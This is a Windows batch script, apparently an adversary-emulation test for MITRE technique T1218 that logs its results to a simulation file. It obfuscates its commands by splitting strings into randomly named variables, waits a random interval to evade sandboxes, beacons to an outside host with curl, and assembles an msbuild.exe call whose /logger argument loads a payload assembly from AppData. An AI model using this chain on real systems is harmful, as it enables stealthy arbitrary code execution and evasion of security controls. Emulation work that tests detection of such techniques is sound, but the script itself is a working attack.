@echo off
SETLOCAL EnableDelayedExpansion

SET zxqpal=%APPDATA%\8664\1020d779
SET qazwsx=https://10.0.0.49
SET plmjko=https://10.0.0.49/stage/2/icon.png?8664-7
SET cxvbne=ITZEL-S2BO
SET poiytr=7
SET lkjhgf=project.txt
SET mnbvcx=8664

SET zzmxqp=%APPDATA%\!poiytr!
SET aqwsed=!zzmxqp!\macula-simulations.log

echo [!DATE! !TIME!][DEBUG][!cxvbne!]: script_start=initialized>> "!aqwsed!" 2>nul
SET /A rxcdft=%RANDOM% * 31 / 32768 + 30
echo [!DATE! !TIME!][DEBUG][!cxvbne!]: delay_start=%rxcdft%s>> "!aqwsed!" 2>nul
timeout /t %rxcdft% /nobreak >nul
echo [!DATE! !TIME!][DEBUG][!cxvbne!]: delay_end=complete>> "!aqwsed!" 2>nul

echo [!DATE! !TIME!][DEBUG][!cxvbne!]: heartbeat_start=connecting>> "!aqwsed!" 2>nul
curl -k -s -o nul "!plmjko!"
echo [!DATE! !TIME!][DEBUG][!cxvbne!]: heartbeat_end=sent>> "!aqwsed!" 2>nul

ping -n 12 127.0.0.1 >nul
echo [!DATE! !TIME!][DEBUG][!cxvbne!]: chdir_start=!zzmxqp!>> "!aqwsed!" 2>nul
cd /d "!zzmxqp!" 2>nul
echo [!DATE! !TIME!][DEBUG][!cxvbne!]: chdir_end=!cd!>> "!aqwsed!" 2>nul

CHOICE /C Y /N /D Y /T 18 >nul

SET xcvdrt=m
SET fghyuj=sb
SET qweasd=uild.exe
SET zxcqwe=!xcvdrt!!fghyuj!!qweasd!

SET pzxcv=/l
SET oiuyt=ogger:Logg
SET mnhbv=erEntry,
SET qazxsw=!zxqpal!\\!lkjhgf!
SET wertyu=;MyParameters,Foo
SET uiopkj=!pzxcv!!oiuyt!!mnhbv!!qazxsw!!wertyu!

echo [!DATE! !TIME!][DEBUG][!cxvbne!]: execution_start=!zxcqwe!>> "!aqwsed!" 2>nul
%zxcqwe% !uiopkj! 2>&1
IF ERRORLEVEL 1 (SET tgbrfv=0 & SET yhnujm=assembly_load_failed) ELSE (SET tgbrfv=1 & SET yhnujm=)
echo [!DATE! !TIME!][DEBUG][!cxvbne!]: execution_end=errorlevel_!errorlevel!>> "!aqwsed!" 2>nul

SET lpoiuy=!poiytr!-!mnbvcx!-T1218|Trusted Developer Utilities Proxy Execution=!tgbrfv!:!yhnujm!
echo [!DATE:~-4!-!DATE:~-7,2!-!DATE:~-10,2! !TIME!][!cxvbne!]: !lpoiuy!>> "!aqwsed!" 2>nul

SET /A zxaqsc=%RANDOM% %% 10 + 5
timeout /t %zxaqsc% /nobreak >nul